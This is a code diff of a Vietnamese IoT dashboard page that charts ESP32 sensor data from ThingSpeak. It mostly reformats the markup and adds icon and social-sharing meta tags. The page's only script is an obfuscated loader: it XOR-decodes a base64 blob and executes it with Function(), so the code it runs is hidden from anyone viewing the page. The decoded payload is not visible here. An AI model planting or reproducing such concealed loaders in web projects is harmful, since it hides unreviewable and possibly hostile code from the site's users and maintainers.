@@ -1,4 +1,238 @@
-<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="Dashboard giám sát nhiệt độ, độ ẩm và ánh sáng từ ESP32 qua ThingSpeak"><title>IoT Environment Dashboard</title><script src="https://cdn.jsdelivr.net/npm/echarts@5/dist/echarts.min.js"></script><style>:root{--bg:#08111f;--bg2:#0d1830;--panel:rgba(17, 31, 55, 0.74);--panel-strong:rgba(17, 31, 55, 0.96);--border:rgba(148, 163, 184, 0.16);--text:#f8fafc;--muted:#94a3b8;--temp:#fb7185;--humidity:#38bdf8;--light:#fbbf24;--green:#34d399;--danger:#f87171;--shadow:0 18px 55px rgba(0, 0, 0, .28)}*{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;min-height:100vh;font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;color:var(--text);background:radial-gradient(circle at 10% -10%,rgba(56,189,248,.16),transparent 28%),radial-gradient(circle at 92% 4%,rgba(251,113,133,.12),transparent 28%),linear-gradient(145deg,var(--bg),var(--bg2))}body::before{content:"";position:fixed;inset:0;pointer-events:none;background-image:linear-gradient(rgba(148,163,184,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(148,163,184,.025) 1px,transparent 1px);background-size:34px 34px;mask-image:linear-gradient(to bottom,#000,transparent 78%)}.wrap{width:min(1500px,calc(100% - 32px));margin:0 auto;padding:28px 0 44px;position:relative;z-index:1}.header{display:flex;align-items:center;justify-content:space-between;gap:18px;margin-bottom:20px}.title-wrap{display:flex;gap:14px;align-items:center;min-width:0}.logo{width:48px;height:48px;border-radius:15px;display:grid;place-items:center;background:linear-gradient(135deg,#0ea5e9,#2563eb 60%,#7c3aed);box-shadow:0 12px 32px rgba(37,99,235,.3);flex:0 0 auto}.logo svg{width:27px;height:27px}h1{font-size:clamp(22px,2.6vw,34px);line-height:1.15;margin:0 0 5px;letter-spacing:-.03em}.subtitle{color:var(--muted);font-size:14px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}.status-pill{display:inline-flex;align-items:center;gap:7px;border:1px solid var(--border);background:rgba(15,23,42,.55);padding:6px 9px;border-radius:999px;font-size:12px;color:#cbd5e1}.dot{width:8px;height:8px;border-radius:50%;background:var(--muted);box-shadow:0 0 0 4px rgba(148,163,184,.08)}.dot.online{background:var(--green);box-shadow:0 0 0 4px rgba(52,211,153,.11),0 0 18px rgba(52,211,153,.65)}.dot.error{background:var(--danger);box-shadow:0 0 0 4px rgba(248,113,113,.12)}.toolbar{display:flex;align-items:center;justify-content:flex-end;flex-wrap:wrap;gap:8px}button,select{appearance:none;border:1px solid var(--border);background:rgba(15,23,42,.68);color:#e2e8f0;border-radius:11px;padding:9px 12px;font:inherit;font-size:13px;outline:0;cursor:pointer;transition:.18s ease}button:hover,select:hover{border-color:rgba(56,189,248,.45);background:rgba(30,41,59,.9)}button:active{transform:translateY(1px)}.refresh-spin svg{animation:spin .75s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:14px}.metric-card{background:linear-gradient(160deg,rgba(30,41,59,.86),rgba(15,23,42,.7));border:1px solid var(--border);border-radius:18px;padding:18px;box-shadow:var(--shadow);overflow:hidden;position:relative}.metric-card::after{content:"";position:absolute;width:120px;height:120px;border-radius:50%;right:-55px;top:-55px;filter:blur(4px);opacity:.13;background:currentColor}.metric-card.temp{color:var(--temp)}.metric-card.humidity{color:var(--humidity)}.metric-card.light{color:var(--light)}.metric-top{display:flex;align-items:center;justify-content:space-between;gap:10px;color:#e2e8f0}.metric-label{font-size:13px;color:#cbd5e1;font-weight:600}.metric-icon{width:34px;height:34px;border-radius:11px;display:grid;place-items:center;background:currentColor}.metric-icon svg{width:18px;height:18px;color:#0f172a}.metric-value{margin:16px 0 8px;font-size:clamp(31px,4vw,46px);line-height:1;font-weight:800;letter-spacing:-.04em;color:#fff}.metric-value small{font-size:.39em;font-weight:600;color:#94a3b8;letter-spacing:0;margin-left:5px}.metric-meta{font-size:12px;color:var(--muted);display:flex;justify-content:space-between;gap:8px}.panel{background:var(--panel);border:1px solid var(--border);border-radius:18px;box-shadow:var(--shadow);padding:16px;backdrop-filter:blur(14px)}.panel-title{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:2px 3px 12px}.panel-title h2{margin:0;font-size:15px;letter-spacing:-.01em}.panel-title span{color:var(--muted);font-size:12px}.grid-main{display:grid;grid-template-columns:2fr 1fr;gap:14px;margin-bottom:14px}.grid-bottom{display:grid;grid-template-columns:1fr 1fr;gap:14px}.chart{height:370px;width:100%}.chart.small{height:320px}.stats-table{width:100%;border-collapse:collapse;margin-top:8px;font-size:12px}.stats-table td,.stats-table th{padding:9px 8px;border-bottom:1px solid rgba(148,163,184,.09);text-align:right}.stats-table td:first-child,.stats-table th:first-child{text-align:left}.stats-table th{color:#94a3b8;font-weight:600}.stats-table tr:last-child td{border-bottom:0}.footer{margin-top:16px;padding:12px 4px;color:#64748b;font-size:12px;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}.toast{position:fixed;right:18px;bottom:18px;padding:12px 14px;border:1px solid var(--border);background:var(--panel-strong);border-radius:12px;box-shadow:var(--shadow);color:#e2e8f0;font-size:13px;transform:translateY(90px);opacity:0;transition:.22s ease;z-index:20;max-width:360px}.toast.show{transform:translateY(0);opacity:1}.toast.error{border-color:rgba(248,113,113,.35)}.badge{font-size:11px;color:#cbd5e1;padding:4px 7px;border-radius:999px;background:rgba(148,163,184,.08);border:1px solid rgba(148,163,184,.12)}.skeleton{opacity:.55}@media (max-width:1000px){.header{align-items:flex-start;flex-direction:column}.toolbar{width:100%;justify-content:flex-start}.grid-bottom,.grid-main{grid-template-columns:1fr}}@media (max-width:680px){.wrap{width:min(100% - 20px,1500px);padding-top:18px}.cards{grid-template-columns:1fr}.chart{height:310px}.chart.small{height:290px}button,select{padding:9px 10px}.metric-card{padding:16px}}</style></head><body><main class="wrap"><header class="header"><div class="title-wrap"><div class="logo" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 13a8 8 0 0 1 16 0"/><path d="M7 13a5 5 0 0 1 10 0"/><path d="M10 13a2 2 0 0 1 4 0"/><circle cx="12" cy="17" r="1.3" fill="currentColor" stroke="none"/></svg></div><div><h1>IoT Environment Dashboard</h1><div class="subtitle"><span>ESP32 · DHT22 · BH1750 · ThingSpeak</span><span class="status-pill"><i id="statusDot" class="dot"></i><span id="statusText">Đang kết nối…</span></span></div></div></div><div class="toolbar"><select id="rangeSelect" aria-label="Chọn khoảng thời gian"><option value="1h">1 giờ</option><option value="1d" selected="selected">1 ngày</option><option value="3d">3 ngày</option><option value="7d">7 ngày</option><option value="all">Tối đa 8.000 mẫu</option></select><button id="refreshBtn" title="Làm mới dữ liệu"><span style="display:flex;align-items:center;gap:7px"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 11a8 8 0 1 0 2 5.5"/><path d="M20 4v7h-7"/></svg>Làm mới</span></button><button id="exportBtn" title="Xuất dữ liệu đang hiển thị ra CSV">Xuất CSV</button></div></header><section class="cards"><article class="metric-card temp"><div class="metric-top"><span class="metric-label">Nhiệt độ hiện tại</span><div class="metric-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 14.8V5a4 4 0 0 0-8 0v9.8a6 6 0 1 0 8 0Z"/><path d="M10 9v7"/></svg></div></div><div class="metric-value"><span id="tempValue">--</span><small>°C</small></div><div class="metric-meta"><span id="tempState">Chưa có dữ liệu</span><span id="tempChange">--</span></div></article><article class="metric-card humidity"><div class="metric-top"><span class="metric-label">Độ ẩm hiện tại</span><div class="metric-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3s6 6.1 6 11a6 6 0 1 1-12 0c0-4.9 6-11 6-11Z"/></svg></div></div><div class="metric-value"><span id="humidityValue">--</span><small>%</small></div><div class="metric-meta"><span id="humidityState">Chưa có dữ liệu</span><span id="humidityChange">--</span></div></article><article class="metric-card light"><div class="metric-top"><span class="metric-label">Cường độ ánh sáng</span><div class="metric-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.42 1.42M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.42-1.42M17.66 6.34l1.41-1.41"/></svg></div></div><div class="metric-value"><span id="lightValue">--</span><small>lux</small></div><div class="metric-meta"><span id="lightState">Chưa có dữ liệu</span><span id="lightChange">--</span></div></article></section><section class="grid-main"><article class="panel"><div class="panel-title"><h2>Nhiệt độ & độ ẩm theo thời gian</h2><span id="historyInfo">--</span></div><div id="tempHumidityChart" class="chart"></div></article><article class="panel"><div class="panel-title"><h2>Thống kê khoảng đang chọn</h2><span class="badge" id="sampleCount">0 mẫu</span></div><div id="gaugeChart" class="chart small"></div><table class="stats-table"><thead><tr><th>Chỉ số</th><th>Min</th><th>TB</th><th>Max</th></tr></thead><tbody><tr><td>Nhiệt độ (°C)</td><td id="tMin">--</td><td id="tAvg">--</td><td id="tMax">--</td></tr><tr><td>Độ ẩm (%)</td><td id="hMin">--</td><td id="hAvg">--</td><td id="hMax">--</td></tr><tr><td>Ánh sáng (lux)</td><td id="lMin">--</td><td id="lAvg">--</td><td id="lMax">--</td></tr></tbody></table></article></section><section class="grid-bottom"><article class="panel"><div class="panel-title"><h2>Ánh sáng - biểu đồ cột</h2><span>24 mẫu gần nhất</span></div><div id="lightBarChart" class="chart small"></div></article><article class="panel"><div class="panel-title"><h2>Phân bố trạng thái ánh sáng</h2><span>Tối / Bình thường / Sáng</span></div><div id="lightPieChart" class="chart small"></div></article></section><footer class="footer"><span>Kênh ThingSpeak #3513038 · Nhóm IoT</span><span id="lastUpdated">Lần cập nhật cuối: --</span></footer></main><div id="toast" class="toast"></div><script>(()=>{
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Dashboard giám sát nhiệt độ, độ ẩm và ánh sáng từ ESP32 qua ThingSpeak" />
+  <title>IoT Environment Dashboard</title>
+
+  <!-- Favicon / app icons -->
+  <link rel="icon" type="image/svg+xml" href="favicon.svg" />
+  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png" />
+  <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png" />
+  <link rel="manifest" href="site.webmanifest" />
+  <meta name="theme-color" content="#08111f" />
+
+  <!-- Open Graph: ảnh hiển thị khi chia sẻ link trên Facebook, Zalo, Discord, Messenger... -->
+  <meta property="og:type" content="website" />
+  <meta property="og:locale" content="vi_VN" />
+  <meta property="og:title" content="IoT Environment Dashboard" />
+  <meta property="og:description" content="Dashboard giám sát nhiệt độ, độ ẩm và ánh sáng từ ESP32 qua ThingSpeak." />
+  <meta property="og:image" content="https://YOUR_GITHUB_USERNAME.github.io/YOUR_REPOSITORY/og-image.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:image:type" content="image/png" />
+
+  <!-- X / Twitter card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="IoT Environment Dashboard" />
+  <meta name="twitter:description" content="Dashboard giám sát nhiệt độ, độ ẩm và ánh sáng từ ESP32 qua ThingSpeak." />
+  <meta name="twitter:image" content="https://YOUR_GITHUB_USERNAME.github.io/YOUR_REPOSITORY/og-image.png" />
+  <script src="https://cdn.jsdelivr.net/npm/echarts@5/dist/echarts.min.js"></script>
+  <style>
+    :root {
+      --bg: #08111f;
+      --bg2: #0d1830;
+      --panel: rgba(17, 31, 55, 0.74);
+      --panel-strong: rgba(17, 31, 55, 0.96);
+      --border: rgba(148, 163, 184, 0.16);
+      --text: #f8fafc;
+      --muted: #94a3b8;
+      --temp: #fb7185;
+      --humidity: #38bdf8;
+      --light: #fbbf24;
+      --green: #34d399;
+      --danger: #f87171;
+      --shadow: 0 18px 55px rgba(0, 0, 0, .28);
+    }
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(circle at 10% -10%, rgba(56, 189, 248, .16), transparent 28%),
+        radial-gradient(circle at 92% 4%, rgba(251, 113, 133, .12), transparent 28%),
+        linear-gradient(145deg, var(--bg), var(--bg2));
+    }
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      background-image: linear-gradient(rgba(148,163,184,.025) 1px, transparent 1px), linear-gradient(90deg, rgba(148,163,184,.025) 1px, transparent 1px);
+      background-size: 34px 34px;
+      mask-image: linear-gradient(to bottom, black, transparent 78%);
+    }
+    .wrap { width: min(1500px, calc(100% - 32px)); margin: 0 auto; padding: 28px 0 44px; position: relative; z-index: 1; }
+    .header {
+      display: flex; align-items: center; justify-content: space-between; gap: 18px; margin-bottom: 20px;
+    }
+    .title-wrap { display: flex; gap: 14px; align-items: center; min-width: 0; }
+    .logo {
+      width: 48px; height: 48px; border-radius: 15px; display: grid; place-items: center;
+      background: linear-gradient(135deg, #0ea5e9, #2563eb 60%, #7c3aed);
+      box-shadow: 0 12px 32px rgba(37, 99, 235, .3); flex: 0 0 auto;
+    }
+    .logo svg { width: 27px; height: 27px; }
+    h1 { font-size: clamp(22px, 2.6vw, 34px); line-height: 1.15; margin: 0 0 5px; letter-spacing: -.03em; }
+    .subtitle { color: var(--muted); font-size: 14px; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+    .status-pill { display: inline-flex; align-items: center; gap: 7px; border: 1px solid var(--border); background: rgba(15, 23, 42, .55); padding: 6px 9px; border-radius: 999px; font-size: 12px; color: #cbd5e1; }
+    .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--muted); box-shadow: 0 0 0 4px rgba(148,163,184,.08); }
+    .dot.online { background: var(--green); box-shadow: 0 0 0 4px rgba(52,211,153,.11), 0 0 18px rgba(52,211,153,.65); }
+    .dot.error { background: var(--danger); box-shadow: 0 0 0 4px rgba(248,113,113,.12); }
+    .toolbar { display: flex; align-items: center; justify-content: flex-end; flex-wrap: wrap; gap: 8px; }
+    button, select {
+      appearance: none; border: 1px solid var(--border); background: rgba(15,23,42,.68); color: #e2e8f0;
+      border-radius: 11px; padding: 9px 12px; font: inherit; font-size: 13px; outline: none; cursor: pointer;
+      transition: .18s ease;
+    }
+    button:hover, select:hover { border-color: rgba(56,189,248,.45); background: rgba(30,41,59,.9); }
+    button:active { transform: translateY(1px); }
+    .refresh-spin svg { animation: spin .75s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px; margin-bottom: 14px; }
+    .metric-card {
+      background: linear-gradient(160deg, rgba(30,41,59,.86), rgba(15,23,42,.7));
+      border: 1px solid var(--border); border-radius: 18px; padding: 18px; box-shadow: var(--shadow); overflow: hidden; position: relative;
+    }
+    .metric-card::after { content:""; position:absolute; width:120px; height:120px; border-radius:50%; right:-55px; top:-55px; filter: blur(4px); opacity:.13; background: currentColor; }
+    .metric-card.temp { color: var(--temp); }
+    .metric-card.humidity { color: var(--humidity); }
+    .metric-card.light { color: var(--light); }
+    .metric-top { display:flex; align-items:center; justify-content:space-between; gap:10px; color:#e2e8f0; }
+    .metric-label { font-size: 13px; color: #cbd5e1; font-weight: 600; }
+    .metric-icon { width: 34px; height: 34px; border-radius: 11px; display:grid; place-items:center; background: currentColor; }
+    .metric-icon svg { width: 18px; height: 18px; color: #0f172a; }
+    .metric-value { margin: 16px 0 8px; font-size: clamp(31px, 4vw, 46px); line-height: 1; font-weight: 800; letter-spacing: -.04em; color: #fff; }
+    .metric-value small { font-size: .39em; font-weight: 600; color: #94a3b8; letter-spacing: 0; margin-left: 5px; }
+    .metric-meta { font-size: 12px; color: var(--muted); display:flex; justify-content:space-between; gap:8px; }
+    .panel {
+      background: var(--panel); border: 1px solid var(--border); border-radius: 18px; box-shadow: var(--shadow); padding: 16px; backdrop-filter: blur(14px);
+    }
+    .panel-title { display:flex; align-items:center; justify-content:space-between; gap:12px; padding: 2px 3px 12px; }
+    .panel-title h2 { margin:0; font-size: 15px; letter-spacing:-.01em; }
+    .panel-title span { color: var(--muted); font-size: 12px; }
+    .grid-main { display:grid; grid-template-columns: 2fr 1fr; gap:14px; margin-bottom:14px; }
+    .grid-bottom { display:grid; grid-template-columns: 1fr 1fr; gap:14px; }
+    .chart { height: 370px; width:100%; }
+    .chart.small { height: 320px; }
+    .stats-table { width:100%; border-collapse: collapse; margin-top: 8px; font-size: 12px; }
+    .stats-table th, .stats-table td { padding: 9px 8px; border-bottom: 1px solid rgba(148,163,184,.09); text-align:right; }
+    .stats-table th:first-child, .stats-table td:first-child { text-align:left; }
+    .stats-table th { color:#94a3b8; font-weight:600; }
+    .stats-table tr:last-child td { border-bottom:0; }
+    .footer { margin-top: 16px; padding: 12px 4px; color: #64748b; font-size: 12px; display:flex; justify-content:space-between; gap:12px; flex-wrap:wrap; }
+    .toast { position: fixed; right: 18px; bottom: 18px; padding: 12px 14px; border: 1px solid var(--border); background: var(--panel-strong); border-radius: 12px; box-shadow: var(--shadow); color:#e2e8f0; font-size:13px; transform: translateY(90px); opacity:0; transition:.22s ease; z-index:20; max-width:360px; }
+    .toast.show { transform: translateY(0); opacity:1; }
+    .toast.error { border-color: rgba(248,113,113,.35); }
+    .badge { font-size: 11px; color:#cbd5e1; padding:4px 7px; border-radius:999px; background:rgba(148,163,184,.08); border:1px solid rgba(148,163,184,.12); }
+    .skeleton { opacity: .55; }
+    @media (max-width: 1000px) {
+      .header { align-items:flex-start; flex-direction:column; }
+      .toolbar { width:100%; justify-content:flex-start; }
+      .grid-main, .grid-bottom { grid-template-columns:1fr; }
+    }
+    @media (max-width: 680px) {
+      .wrap { width:min(100% - 20px, 1500px); padding-top:18px; }
+      .cards { grid-template-columns:1fr; }
+      .chart { height:310px; }
+      .chart.small { height:290px; }
+      button, select { padding:9px 10px; }
+      .metric-card { padding:16px; }
+    }
+  </style>
+</head>
+<body>
+  <main class="wrap">
+    <header class="header">
+      <div class="title-wrap">
+        <div class="logo" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 13a8 8 0 0 1 16 0"/><path d="M7 13a5 5 0 0 1 10 0"/><path d="M10 13a2 2 0 0 1 4 0"/><circle cx="12" cy="17" r="1.3" fill="currentColor" stroke="none"/></svg>
+        </div>
+        <div>
+          <h1>IoT Environment Dashboard</h1>
+          <div class="subtitle">
+            <span>ESP32 · DHT22 · BH1750 · ThingSpeak</span>
+            <span class="status-pill"><i id="statusDot" class="dot"></i><span id="statusText">Đang kết nối…</span></span>
+          </div>
+        </div>
+      </div>
+      <div class="toolbar">
+        <select id="rangeSelect" aria-label="Chọn khoảng thời gian">
+          <option value="1h">1 giờ</option>
+          <option value="1d" selected>1 ngày</option>
+          <option value="3d">3 ngày</option>
+          <option value="7d">7 ngày</option>
+          <option value="all">Tối đa 8.000 mẫu</option>
+        </select>
+        <button id="refreshBtn" title="Làm mới dữ liệu">
+          <span style="display:flex;align-items:center;gap:7px"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 11a8 8 0 1 0 2 5.5"/><path d="M20 4v7h-7"/></svg>Làm mới</span>
+        </button>
+        <button id="exportBtn" title="Xuất dữ liệu đang hiển thị ra CSV">Xuất CSV</button>
+      </div>
+    </header>
+
+    <section class="cards">
+      <article class="metric-card temp">
+        <div class="metric-top"><span class="metric-label">Nhiệt độ hiện tại</span><div class="metric-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 14.8V5a4 4 0 0 0-8 0v9.8a6 6 0 1 0 8 0Z"/><path d="M10 9v7"/></svg></div></div>
+        <div class="metric-value"><span id="tempValue">--</span><small>°C</small></div>
+        <div class="metric-meta"><span id="tempState">Chưa có dữ liệu</span><span id="tempChange">--</span></div>
+      </article>
+      <article class="metric-card humidity">
+        <div class="metric-top"><span class="metric-label">Độ ẩm hiện tại</span><div class="metric-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3s6 6.1 6 11a6 6 0 1 1-12 0c0-4.9 6-11 6-11Z"/></svg></div></div>
+        <div class="metric-value"><span id="humidityValue">--</span><small>%</small></div>
+        <div class="metric-meta"><span id="humidityState">Chưa có dữ liệu</span><span id="humidityChange">--</span></div>
+      </article>
+      <article class="metric-card light">
+        <div class="metric-top"><span class="metric-label">Cường độ ánh sáng</span><div class="metric-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.42 1.42M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.42-1.42M17.66 6.34l1.41-1.41"/></svg></div></div>
+        <div class="metric-value"><span id="lightValue">--</span><small>lux</small></div>
+        <div class="metric-meta"><span id="lightState">Chưa có dữ liệu</span><span id="lightChange">--</span></div>
+      </article>
+    </section>
+
+    <section class="grid-main">
+      <article class="panel">
+        <div class="panel-title"><h2>Nhiệt độ & độ ẩm theo thời gian</h2><span id="historyInfo">--</span></div>
+        <div id="tempHumidityChart" class="chart"></div>
+      </article>
+      <article class="panel">
+        <div class="panel-title"><h2>Thống kê khoảng đang chọn</h2><span class="badge" id="sampleCount">0 mẫu</span></div>
+        <div id="gaugeChart" class="chart small"></div>
+        <table class="stats-table">
+          <thead><tr><th>Chỉ số</th><th>Min</th><th>TB</th><th>Max</th></tr></thead>
+          <tbody>
+            <tr><td>Nhiệt độ (°C)</td><td id="tMin">--</td><td id="tAvg">--</td><td id="tMax">--</td></tr>
+            <tr><td>Độ ẩm (%)</td><td id="hMin">--</td><td id="hAvg">--</td><td id="hMax">--</td></tr>
+            <tr><td>Ánh sáng (lux)</td><td id="lMin">--</td><td id="lAvg">--</td><td id="lMax">--</td></tr>
+          </tbody>
+        </table>
+      </article>
+    </section>
+
+    <section class="grid-bottom">
+      <article class="panel">
+        <div class="panel-title"><h2>Ánh sáng - biểu đồ cột</h2><span>24 mẫu gần nhất</span></div>
+        <div id="lightBarChart" class="chart small"></div>
+      </article>
+      <article class="panel">
+        <div class="panel-title"><h2>Phân bố trạng thái ánh sáng</h2><span>Tối / Bình thường / Sáng</span></div>
+        <div id="lightPieChart" class="chart small"></div>
+      </article>
+    </section>
+
+    <footer class="footer">
+      <span>Kênh ThingSpeak #3513038 · Nhóm IoT</span>
+      <span id="lastUpdated">Lần cập nhật cuối: --</span>
+    </footer>
+  </main>
+  <div id="toast" class="toast"></div>
+
+  <script>
+    (()=>{
       const _0x4f2=[90,49,199,25,132,46,109,179,7,241,72,149,34,206,115,11];
       const _0x91a=
       'UBHnOaRNAt10hWjWao89RR99mFDADlCTIMJ9pBH+QDN9Cs05pA5N0GifO+ECnDZKHm6GSc1xJvZe0XW1Bfk6SQID8SC1eDSHXqYJ0xTpSCtQEec5pE0C3XSFaNRyhyxJG2KCObkODdtzhTjmGOFcaipY6W3sRwPUdIEt9EngEGQ3HqRx5UAD' +
@@ -108,4 +342,7 @@
       const _0x2c8=Uint8Array.from(atob(_0x91a),_0x7d1=>_0x7d1.charCodeAt(0));
       for(let _0x6b4=0;_0x6b4<_0x2c8.length;_0x6b4++)_0x2c8[_0x6b4]^=_0x4f2[_0x6b4%_0x4f2.length];
       (0,Function)(new TextDecoder().decode(_0x2c8))();
-    })();</script></body></html>
+    })();
+  </script>
+</body>
+</html>
